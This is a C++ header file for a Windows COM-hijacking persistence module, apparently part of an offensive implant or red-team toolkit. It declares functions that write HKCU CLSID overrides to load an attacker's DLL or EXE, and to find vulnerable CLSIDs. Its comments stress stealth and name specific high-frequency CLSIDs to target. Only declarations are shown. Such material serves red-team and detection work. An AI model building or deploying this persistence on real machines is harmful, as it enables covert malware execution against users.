#pragma once
#ifndef COMHIJACK_H
#define COMHIJACK_H
#include "common.h"

// COMHijack — COM object hijacking via HKCU (T1546.015).
//
// Windows COM resolution order: HKCU\Software\Classes\CLSID takes priority
// over HKLM\SOFTWARE\Classes\CLSID. Any user-writable HKCU key can override
// a system COM object with our own DLL or executable.
//
// Why this is stealthy:
//   - No admin required (HKCU is writable by any user)
//   - No new process spawned on install (just a registry write)
//   - Fires every time a legitimate application tries to use the hijacked CLSID
//   - Many scheduled tasks, Explorer, and Office apps load COM objects at startup
//
// Common hijackable CLSIDs (loaded by Explorer/scheduled tasks, high frequency):
//   {BCDE0395-E52F-467C-8E3D-C4579291692E} — MsRdpClient (loaded by many apps)
//   {D63B10C5-BB46-4990-A94F-E40B9D520160} — Windows Script Host
//   {9BA05972-F6A8-11CF-A442-00A0C90A8F39} — ShellWindows (loaded by Explorer)
//
// MITRE T1546.015 — Event Triggered Execution: Component Object Model Hijacking

namespace COMHijack {
    // Install: write HKCU\Software\Classes\CLSID\{clsid}\InprocServer32 → dllPath
    // The DLL will be loaded by any process that CoCreates this CLSID.
    std::string Install(const char* clsid, const char* dllPath);

    // Install LocalServer32 variant (runs an EXE instead of a DLL)
    std::string InstallExe(const char* clsid, const char* exePath);

    // Remove the HKCU override for a given CLSID
    std::string Remove(const char* clsid);

    // List all HKCU CLSID overrides currently installed
    std::string List();

    // Enumerate CLSIDs vulnerable to HKCU hijacking (registered in HKLM but not HKCU)
    // Returns up to `maxResults` candidates loaded by high-value processes.
    std::string FindVulnerable(int maxResults = 10);
}

#endif
